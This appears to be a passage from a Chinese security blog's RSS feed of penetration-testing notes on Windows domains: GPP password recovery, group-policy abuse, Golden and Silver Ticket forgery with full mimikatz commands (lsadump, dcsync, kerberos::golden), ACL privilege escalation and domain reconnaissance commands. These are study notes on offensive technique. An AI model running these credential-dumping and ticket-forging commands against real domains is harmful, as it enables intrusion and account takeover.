&lt;p&gt;组策略分作&lt;strong&gt;主机策略和用户策略&lt;/strong&gt;，machine和users目录； 脚本类型和非脚本类型, script目录&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;域服务器如何存储组策略&#34;&gt;域服务器如何存储组策略&lt;/h2&gt;
&lt;p&gt;存储在服务器中，&lt;code&gt;\domain\sysvol\policies&lt;/code&gt;，以明文方式存储为xml、ini、inf等文件。&lt;strong&gt;对域内所有用户开放读权限&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 267; 
			flex-basis: 641px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-3/image-20220221201847736.png&#34; data-size=&#34;497x186&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-3/image-20220221201847736.png&#34;
			width=&#34;497&#34;
			height=&#34;186&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-3/image-20220221201847736_hub03dd9220bbe84fba418cfb661971c34_69719_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-3/image-20220221201847736_hub03dd9220bbe84fba418cfb661971c34_69719_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;组策略更新&#34;&gt;组策略更新&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;客户端每90分钟主动获取一次组策略，检查组策略是否发生变更&lt;/li&gt;
&lt;li&gt;客户端使用&lt;code&gt;gpupdate /force&lt;/code&gt;强制立即检查组策略；参数可以分为主机和用户，&lt;code&gt;gpupdate /force /target:computer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;组策略的下发与获取&#34;&gt;组策略的下发与获取&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;组策略的查询原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt; LDAP&lt;/code&gt;检索所有的组策略，哪些是属于自己的，服务器决定需要返回哪些策略（版本号是决定的重要因素）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Kerberos协议认证&lt;/li&gt;
&lt;li&gt;LDAP协议去查询&lt;/li&gt;
&lt;li&gt;SMB协议去获取并下发&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;组策略中的口令明文&#34;&gt;组策略中的口令明文&lt;/h2&gt;
&lt;p&gt;某些场景下，需要批量给域内主机改口令、添加共享磁盘等，因此会编写一些脚本去做，比如VB脚本，而执行上述某些功能(VB脚本中的操作)是需要域管理员的口令，为了以脚本形式批量操作，会把口令明文直接放在脚本中。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 197; 
			flex-basis: 474px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217201656500.png&#34; data-size=&#34;814x412&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217201656500.png&#34;
			width=&#34;814&#34;
			height=&#34;412&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217201656500_hu235bd5d166ee4dd93c2ed2fb1cd54535_175352_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-3/image-20220217201656500_hu235bd5d166ee4dd93c2ed2fb1cd54535_175352_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在2008、12、16等，已经不存在这种明文形式了，因为系统管理方式发生变化。&lt;/p&gt;
&lt;h2 id=&#34;组策略中的口令密文&#34;&gt;组策略中的口令密文&lt;/h2&gt;
&lt;p&gt;微软收购&amp;quot;PolicyMaker&amp;quot;，在Win 2008中发布了GPP(Group Policy Preferences)。对于某些仍然需要用户凭证的场景，例如下列，GPP实现会在xml等文件中留下口令经AES加密过后的密文。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;映射驱动(Drivers.xml)&lt;/li&gt;
&lt;li&gt;创建本地用户&lt;/li&gt;
&lt;li&gt;数据源(DataSources.xml)&lt;/li&gt;
&lt;li&gt;创建/更新服务(Services.xml)&lt;/li&gt;
&lt;li&gt;计划任务(ScheduledTasks.xml)&lt;/li&gt;
&lt;li&gt;更改Administrator密码&lt;/li&gt;
&lt;li&gt;打印机配置(Printers.xml)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 268; 
			flex-basis: 643px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205308969.png&#34; data-size=&#34;587x219&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205308969.png&#34;
			width=&#34;587&#34;
			height=&#34;219&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205308969_hu7fe7efa35fb6085a6a962b0149c89183_151935_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-3/image-20220217205308969_hu7fe7efa35fb6085a6a962b0149c89183_151935_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最关键的是，经研究发现，其所使用的&lt;strong&gt;AES加密密钥是固定不变&lt;/strong&gt;的，即所有涉及这些场景口令的加密密钥都是一样的：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 426; 
			flex-basis: 1023px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205322745.png&#34; data-size=&#34;550x129&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205322745.png&#34;
			width=&#34;550&#34;
			height=&#34;129&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217205322745_huae2ec39b5a6b3a0e5f7e61fb2664fc0d_57168_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-3/image-20220217205322745_huae2ec39b5a6b3a0e5f7e61fb2664fc0d_57168_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因此，本地所存放的密文等同于明文。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PowerSploit中提供&lt;code&gt;GET-GPPPassword&lt;/code&gt;模块去获取组策略中的口令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 377; 
			flex-basis: 906px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217210010030.png&#34; data-size=&#34;714x189&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217210010030.png&#34;
			width=&#34;714&#34;
			height=&#34;189&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-3/image-20220217210010030_hu5ef6ac47546ab1ed8848c63fee8672a7_115091_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-3/image-20220217210010030_hu5ef6ac47546ab1ed8848c63fee8672a7_115091_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2008上仍然有效，由于存在这样的问题，微软在2012、2016已经取消GPP这种方式。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;组策略攻击客户端&#34;&gt;组策略攻击客户端&lt;/h2&gt;
&lt;h3 id=&#34;背景&#34;&gt;背景&lt;/h3&gt;
&lt;p&gt;当域内某**客户端开启防火墙，或者关闭Server服务(445端口)**后，攻击者则无法直接进入域内某客户端。这时候可尝试通过组策略攻击客户端。&lt;/p&gt;
&lt;h3 id=&#34;组策略更新-1&#34;&gt;组策略更新&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;当一个客户端登录进域后，它会查询自己所在组是否有组策略更新，如果有更新就会执行更新内容，比如执行脚本等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用&lt;code&gt;gpupdate&lt;/code&gt;命令强行主动更新组策略&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;因此在拿到域控制权后，而无法直接进入域内客户端情况下，可以更改目标客户端用户的组策略，以实现：&lt;strong&gt;用户登录时，下载恶意文件并执行，以取得控制权&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;思考：为啥不直接改策略把445开启？是因为445开启相关的组策略不是启动更新，必须强制更新？&lt;/p&gt;
</description>
        </item>
        <item>
        <title>黄金票据、白银票据</title>
        <link>https://coollllllll.github.io/p/intranet-7/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-7/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-7/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 黄金票据、白银票据" /&gt;&lt;h1 id=&#34;黄金票据&#34;&gt;黄金票据&lt;/h1&gt;
&lt;p&gt;BlackHat 2014上， Mimikatz的作者剖析了微软实现的Kerberos协议中存在的安全缺陷，即黄金票据（Golden Ticket） ，对应的有白银票据（Silver Ticket）。由于是协议实现过程中的设计逻辑缺陷，没有补丁。影响全系列Windows系统，包括最新版Windows 2016。&lt;/p&gt;
&lt;h2 id=&#34;构造原理&#34;&gt;构造原理&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 159; 
			flex-basis: 382px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227192929504.png&#34; data-size=&#34;1388x870&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227192929504.png&#34;
			width=&#34;1388&#34;
			height=&#34;870&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227192929504_huf479173d97a9177f67bec9781533a842_485866_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227192929504_huf479173d97a9177f67bec9781533a842_485866_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;构造条件&#34;&gt;构造条件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;krbtgt账号的NTLM
&lt;ul&gt;
&lt;li&gt;域升级、重装才会自动改变NTLM&lt;/li&gt;
&lt;li&gt;连续2次修改口令才会激发系统随机重置krbtgt账号的NTLM&lt;/li&gt;
&lt;li&gt;有的域自从安装后，再未变更过krbtgt账号的NTLM&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;域SID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;任意一台域内主机均可获取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有域内主机&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;获取krbtgt账户的ntlm&#34;&gt;获取krbtgt账户的NTLM&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;1sadump::1sa /patch&amp;quot; exit &amp;gt; 2.txt

# 域内任何主机都可，但是cmd环境得是域内用户
mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;1sadump::dcsync /user:krbtgt@adsec.com&amp;quot; exit &amp;gt; hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;获取域sid&#34;&gt;获取域SID&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Get-DomainSID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 890; 
			flex-basis: 2136px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227195815631.png&#34; data-size=&#34;534x60&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227195815631.png&#34;
			width=&#34;534&#34;
			height=&#34;60&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227195815631_huc57cfc88335ee749a297efe0ca6650c8_7148_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227195815631_huc57cfc88335ee749a297efe0ca6650c8_7148_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看注册表&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 307; 
			flex-basis: 738px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227200046619.png&#34; data-size=&#34;649x211&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227200046619.png&#34;
			width=&#34;649&#34;
			height=&#34;211&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227200046619_hu8bb150bbb89aeb547f9fff0dd7e79817_51192_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227200046619_hu8bb150bbb89aeb547f9fff0dd7e79817_51192_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;制作&#34;&gt;制作&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;kerberos::golden /user:anyusername /domain:adsec.com /sid:S-1-5-21-2732272027-1570987391-2638982533 /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt&amp;quot; exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 114; 
			flex-basis: 275px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227201616331.png&#34; data-size=&#34;984x857&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227201616331.png&#34;
			width=&#34;984&#34;
			height=&#34;857&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227201616331_hu051e59728050f41ff5e5fed197e6f230_667630_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227201616331_hu051e59728050f41ff5e5fed197e6f230_667630_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实际上这里&lt;code&gt;dir&lt;/code&gt;命令访问的就是目标主机上的CIFS服务(SMB)，而黄金票据攻击之后，本地已经缓存好TGT，所以访问服务时便可正常进行TGS的申请和使用等等。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;黄金票据攻击成功后，发现使用域名去访问目标是可行的，但是以IP方式访问目标却被拒绝。&lt;/p&gt;
&lt;p&gt;这是因为以域名访问表明用的是Kerberos协议，IP访问则表明用的是NTLM协议，而黄金票据是基于Kerberos协议的漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;黄金票据攻击后访问服务所产生的日志&#34;&gt;黄金票据攻击后访问服务所产生的日志&lt;/h2&gt;
&lt;p&gt;Win Server 2016&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 206; 
			flex-basis: 496px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202007002.png&#34; data-size=&#34;1475x713&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202007002.png&#34;
			width=&#34;1475&#34;
			height=&#34;713&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202007002_hu49d0f201a184d0af5e8d4a72b865985d_530231_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227202007002_hu49d0f201a184d0af5e8d4a72b865985d_530231_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 197; 
			flex-basis: 474px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202419169.png&#34; data-size=&#34;1312x664&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202419169.png&#34;
			width=&#34;1312&#34;
			height=&#34;664&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227202419169_hua219ee5006b29b3df3af1e2005b0a28d_518537_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227202419169_hua219ee5006b29b3df3af1e2005b0a28d_518537_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;白银票据&#34;&gt;白银票据&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;最常见的是利用主机账号NTLM做白银票据，以最高权限访问主机服务（HOST等服务）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其次是利用服务账号NTLM做白银票据，以最高权限访问服务&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;kerberos::golden /user:anyusername /domain:adsec.com /sid:S-1-5-21-2732272027-10987391-2638982533 /target:win2016-dc01.adsec.com /rc4:9cf82blec7cab3b4c7bf18b53569d188 /service:cifs /ptt&amp;quot; exit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 586px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227205928794.png&#34; data-size=&#34;665x272&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227205928794.png&#34;
			width=&#34;665&#34;
			height=&#34;272&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-7/image-20220227205928794_hu066d4e33dd8915215eadf34f533a6a1f_187034_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-7/image-20220227205928794_hu066d4e33dd8915215eadf34f533a6a1f_187034_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ACL 相关</title>
        <link>https://coollllllll.github.io/p/intranet-6/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-6/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post ACL 相关" /&gt;&lt;h1 id=&#34;acl-相关&#34;&gt;ACL 相关&lt;/h1&gt;
&lt;h2 id=&#34;access-control-link&#34;&gt;Access Control Link&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;所有的Windows对象都称为安全对象，文件、进程、注册表、内存等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为每个安全对象赋予一个安全描述符(Security descriptor)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Security identifiers (SIDs)for the owner and primary group of an object&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A DACL that specifies the access rights allowed or denied to particular users or groups&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A SACL that specifies the types of access attempts that generate audit records for the object&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dacl&#34;&gt;DACL&lt;/h2&gt;
&lt;p&gt;DACL由多个ACE(Access Control Entry)组成。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 197; 
			flex-basis: 474px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-6/image-20220221211913675.png&#34; data-size=&#34;650x329&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-6/image-20220221211913675.png&#34;
			width=&#34;650&#34;
			height=&#34;329&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-6/image-20220221211913675_hudc4fef0628a2f15973bd9c5f2d140f29_138727_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-6/image-20220221211913675_hudc4fef0628a2f15973bd9c5f2d140f29_138727_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;windows的访问控制&#34;&gt;Windows的访问控制&lt;/h2&gt;
&lt;p&gt;Windows的访问控制包括三部分:访问令牌、对象安全描述符和访问检查。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问令牌作为一个容器，通过Token体现&lt;/li&gt;
&lt;li&gt;对象安全描述符表示目标对象的安全属性，通过安全矩阵详细描述该对象赋予不同用户组的权限&lt;/li&gt;
&lt;li&gt;访问检查表示通过比较访问令牌和ACL，以决定该进程是否具有访问时申请的相应权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Windows中高权限服务、进程所拥有的文件、目录如果&lt;strong&gt;存在着ACL设置不当，对低权限用户开放了“写”甚至“执行”权限&lt;/strong&gt;，低权限用户可以通过修改、替换文件内容来达到执行指定代码的目的。&lt;/p&gt;
&lt;p&gt;例如Windows的System332目录如果开放了写权限,则可以向目录写入一个DLL,等待系统重新启动,由 Svchost等程序加载即可实现权限提升。&lt;/p&gt;
&lt;h2 id=&#34;acl检查&#34;&gt;ACL检查&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Sysinternalsuit提供的&lt;code&gt;accesschk.exe&lt;/code&gt;可以对指定的目录、文件进行ACL检查。命令为&lt;code&gt;accesschk.exe -w -s directory &lt;/code&gt;，其中directory为需要检测的目录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;accesschk.exe可以审计进程对所有用户组开放的权限。采用命令&lt;code&gt;accesschk.exe -p pid&lt;/code&gt;可以获取某个进程开放的权限，其中pid可以用&lt;code&gt;*&lt;/code&gt;代，表示检测所有进程对不同用户组开放的权限。&lt;strong&gt;为了保证正常运行,运行accesschk.exe时需要较高的权限。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;accesschk.exe同样可用于审计服务，通过命令&lt;code&gt;accesschk.exe -c *&lt;/code&gt;可审计所有服务对所有用户组开放的权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注册表中的启动项、服务加载项如果对低权限用户开放了写权限，低权限用户可以向这些表项写入指定的文件，等待系统重新启动后实现权限提升。使用命令&lt;code&gt;accesschk.exe -w -s -k HKLM&lt;/code&gt;，表示递归扫描HKLM中开放了写权限的表项。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程acl利用&#34;&gt;进程ACL利用&lt;/h3&gt;
&lt;p&gt;当检查发现存在低权限用户对某高权限进程有读写权限，可有如下两种方式进行利用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一种&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过OpenProcess获取进程句柄，并将目标代码写入该进程空间中，以该进程的权限运行这些代码，运行代码权限为该进程权限。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第二种&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过OpenProcess获取进程句柄，再通过OpenProcessToken获取该进程的Token，并利用该Token通过CreateProcessAsUser创建新的进程，新的进程权限和目标进程权限一致。&lt;/p&gt;
&lt;h2 id=&#34;相关漏洞&#34;&gt;相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;MS10-059：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;一些Windows应用中使用了 Tracing 功能记录调试信息。使用了这个 Tracing 功能的 Windows 进程会持续监控相关子键的变化，一旦注册表值发生了变化就会立即读取该值。
其中的一个注册表值为 FileDirectory，包含有 Windows目录名。在Local System 账号运行的服务连接到管道时拥有扮演权限的本地用户可以通过扮演为 Local System 账号（或Administrator等特权账号）提升权限。
注册表项对 Users 组开放了 Set Value 权限，因此任何通过认证的用户都可以设置任意值。
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>域信息获取及分析</title>
        <link>https://coollllllll.github.io/p/intranet-2/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/intranet-2/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/intranet-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 域信息获取及分析" /&gt;&lt;h1 id=&#34;域信息获取及分析&#34;&gt;域信息获取及分析&lt;/h1&gt;
&lt;h2 id=&#34;基础信息获取及分析&#34;&gt;基础信息获取及分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;当前主机所在域的域名、网段、域服务器&lt;/li&gt;
&lt;li&gt;多少域&lt;/li&gt;
&lt;li&gt;域分组、用户、主机、服务器、账户策略(口令策略等)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 获取域信息
whoami
systeminfo
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net user testuser2 /domain
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 81; 
			flex-basis: 196px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205163617542.png&#34; data-size=&#34;336x410&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205163617542.png&#34;
			width=&#34;336&#34;
			height=&#34;410&#34;
			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205163617542_hu122519dfc983fbde1340ef8ac90c1792_9275_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205163617542_hu122519dfc983fbde1340ef8ac90c1792_9275_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：&lt;code&gt;登录脚本&lt;/code&gt;可用于后续攻击&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 获取网卡、网段信息
ipconfig /all
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查询域
net view /domain
# 该命令有时候会报6118错误，可通过开启 Computer Browser服务解决

# 查询域内组信息
net group /domain
Get-DomainGroup | select distinguishedname

# 获取相关组成员信息
net user /domain
net group &amp;quot;domain users&amp;quot; /domain
net group &amp;quot;domain admins&amp;quot; /domain

# 获取域成员计算机列表
net group &amp;quot;domain computers&amp;quot; /domain

# 获取域控制器计算机列表
net group &amp;quot;domain controllers&amp;quot; /domain
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;写脚本流程化跑一下获取信息的命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;相关工具&#34;&gt;相关工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;csvde(只获取所有信息，不筛选)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;csvde -m -f output.csv
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;ldifde&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;获取对象信息及特性&#34;&gt;获取对象信息及特性&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-ADObject 对象名
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;用户信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 149; 
			flex-basis: 357px&#34;
	&gt;
